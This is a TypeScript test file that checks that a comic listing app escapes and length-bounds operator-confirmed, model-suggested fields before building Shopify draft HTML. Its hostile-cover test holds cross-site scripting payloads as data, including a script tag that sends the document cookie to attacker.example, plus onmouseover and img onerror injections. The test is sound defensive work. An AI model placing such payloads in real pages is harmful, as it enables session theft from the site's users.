// 046 §11 I3: **no client-authored string reaches a provider payload unescaped.**
// I3 names this file and says it "fails on the current tree" at
// `draftRequested.ts:129-140`. This is the assertion that stops being true.
//
// Bead: longbox-e5b.3.12 (alias E03-D02). Docs: 046 §4 B9, §5 A16, §11 I3;
// 042 §3; 043 §4.
//
// THE PATH UNDER TEST IS THE MODEL'S, NOT A HAND-CRAFTED BODY. The hostile
// values below arrive the way they actually would: as a CANDIDATE the vision
// provider returned, rendered on the phone, tapped once by an operator
// (`public/app.js` one-tap → `confirmIssue`), parsed by the v1 contract, stored
// on `human_confirmation`, and read back by the draft job. So each test drives
// `confirmRequest` first and feeds ITS OUTPUT to `composeDraftInput` — because a
// test that hand-built the stored value would be asserting the escape while
// silently skipping the bound, and the two only hold together.
//
// The hostile cover is 046 §5 A8's: a sticker, a QR code or printed text on the
// book carrying markup. The operator confirming it is the design working
// (022 P1), which is exactly why the string cannot be trusted downstream.
import { describe, expect, it } from "vitest";
import {
  boundedText,
  composeDraftInput,
  escapeHtml,
  type DraftFacts,
} from "../src/consumers/draftRequested.js";
import { confirmRequest } from "../src/contracts/v1/schemas.js";

/** What the phone posts for a one-tap confirm of `candidate` (public/app.js). */
function oneTapBody(candidate: Record<string, unknown>): unknown {
  const issue: Record<string, string> = {};
  for (const field of ["title", "issue", "variant", "publisher", "year", "upc"]) {
    const value = candidate[field];
    if (value === null || value === undefined || value === "") continue;
    if (typeof value === "object") continue;
    issue[field] = String(value);
  }
  return { issue, source: "one_tap" };
}

/** The stored `confirmed_issue`, having gone through the real contract. */
function storedIssue(candidate: Record<string, unknown>): Record<string, unknown> {
  const parsed = confirmRequest.safeParse(oneTapBody(candidate));
  if (!parsed.success) throw new Error(`the contract refused the one-tap body: ${parsed.error.message}`);
  return parsed.data.issue as Record<string, unknown>;
}

function factsFor(candidate: Record<string, unknown>, defects: string[] = []): DraftFacts {
  return {
    confirmedIssue: storedIssue(candidate),
    pricing: { suggested_cents: 1299, override_cents: null },
    assessment: { grade_range_low: "VG", grade_range_high: "FN", defects },
    coverUrls: [],
  };
}

describe("the contract bounds what a confirm may carry (042 §3, 046 §5 A16)", () => {
  it("accepts the six declared fields as strings", () => {
    const parsed = confirmRequest.safeParse({
      issue: {
        title: "Uncanny X-Men",
        issue: "141",
        variant: "Newsstand",
        publisher: "Marvel",
        year: "1981",
      },
      source: "one_tap",
    });
    expect(parsed.success).toBe(true);
  });

  it("refuses an undeclared key rather than storing it silently", () => {
    const parsed = confirmRequest.safeParse({
      issue: { title: "X", evidence: "model said so" },
      source: "one_tap",
    });
    expect(parsed.success).toBe(false);
  });

  it("refuses a nested object and an over-long field — the old z.record accepted both", () => {
    expect(confirmRequest.safeParse({ issue: { title: { deep: "no" } }, source: "one_tap" }).success).toBe(
      false
    );
    expect(confirmRequest.safeParse({ issue: { title: "x".repeat(301) }, source: "one_tap" }).success).toBe(
      false
    );
  });
});

describe("composeDraftInput escapes and bounds every value crossing B9", () => {
  it("HOSTILE COVER: markup in title and variant never reaches the storefront as markup", () => {
    const facts = factsFor({
      title: '<script>fetch("https://attacker.example?c="+document.cookie)</script>',
      issue: "1",
      variant: '" onmouseover="alert(1)',
      publisher: '<img src=x onerror="alert(1)">',
      year: "1963",
    });
    const draft = composeDraftInput(facts, "copy-1")!;

    // The description is the HTML sink, and it carries no live markup at all.
    expect(draft.descriptionHtml).not.toContain("<script");
    expect(draft.descriptionHtml).not.toContain("<img");
    expect(draft.descriptionHtml).not.toContain('onerror="');
    expect(draft.descriptionHtml).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
    // The only tags in it are the two this function writes itself.
    expect(draft.descriptionHtml.match(/<[a-z/]/g)).toEqual(["<p", "</", "<p", "</"]);

    // The title is a PLAIN-TEXT field in Shopify, so it is bounded and passed
    // through rather than escaped — escaping a non-HTML sink would put `&amp;`
    // in front of a customer. It is not an HTML sink and nothing renders it as one.
    expect(draft.title).toContain("<script>");
  });

  it("A 10 KB TITLE IS BOUNDED, and the bound is applied to the stored value too", () => {
    const long = "A".repeat(10_240);
    // The contract refuses it outright on the way in…
    expect(confirmRequest.safeParse({ issue: { title: long }, source: "one_tap" }).success).toBe(false);
    // …and `composeDraftInput` bounds it anyway, because `human_confirmation` is
    // append-only and rows written before this bead are still unbounded.
    const draft = composeDraftInput(
      {
        confirmedIssue: { title: long, publisher: "B".repeat(10_240), year: "1".repeat(64) },
        pricing: { suggested_cents: 100, override_cents: null },
        assessment: undefined,
        coverUrls: [],
      },
      "copy-legacy"
    )!;
    expect(draft.title.length).toBe(300);
    expect(draft.descriptionHtml.length).toBeLessThan(500);
  });

  it("a legacy row carrying a NESTED object contributes nothing rather than [object Object]", () => {
    const draft = composeDraftInput(
      {
        confirmedIssue: { title: "Daredevil", publisher: { evil: true } as unknown as string },
        pricing: { suggested_cents: 100, override_cents: null },
        assessment: undefined,
        coverUrls: [],
      },
      "copy-legacy-2"
    )!;
    expect(draft.descriptionHtml).toBe("<p></p><p></p>");
  });

  it("defect callouts are escaped too — they are client-supplied strings on the same page", () => {
    const facts = factsFor({ title: "Hulk", issue: "181" }, ["spine_ticks", '<b>"key issue"</b>']);
    const draft = composeDraftInput(facts, "copy-2")!;
    expect(draft.descriptionHtml).not.toContain("<b>");
    expect(draft.descriptionHtml).toContain("&lt;b&gt;");
  });

  it("an ordinary listing still reads like one — the escape is invisible when nothing is hostile", () => {
    const facts = factsFor(
      { title: "Uncanny X-Men", issue: "141", variant: "Newsstand", publisher: "Marvel", year: "1981" },
      ["spine_ticks"]
    );
    const draft = composeDraftInput(facts, "copy-3")!;
    expect(draft.title).toBe("Uncanny X-Men #141 Newsstand");
    expect(draft.descriptionHtml).toBe("<p>Marvel, 1981</p><p>Condition: VG-FN. Noted: spine ticks</p>");
  });
});

describe("the two helpers, on their own", () => {
  it("escapeHtml covers the five characters and never double-escapes an ampersand", () => {
    expect(escapeHtml(`<>&"'`, 100)).toBe("&lt;&gt;&amp;&quot;&#39;");
    expect(escapeHtml("Tom & Jerry", 100)).toBe("Tom &amp; Jerry");
  });

  it("bounds BEFORE escaping, so a truncation cannot cut an entity in half", () => {
    // Five raw characters capped at 5 → five entities, none of them severed.
    expect(escapeHtml("<<<<<", 5)).toBe("&lt;&lt;&lt;&lt;&lt;");
    expect(boundedText("abcdef", 3)).toBe("abc");
    expect(boundedText(undefined, 10)).toBe("");
    expect(boundedText({ a: 1 }, 10)).toBe("");
  });
});
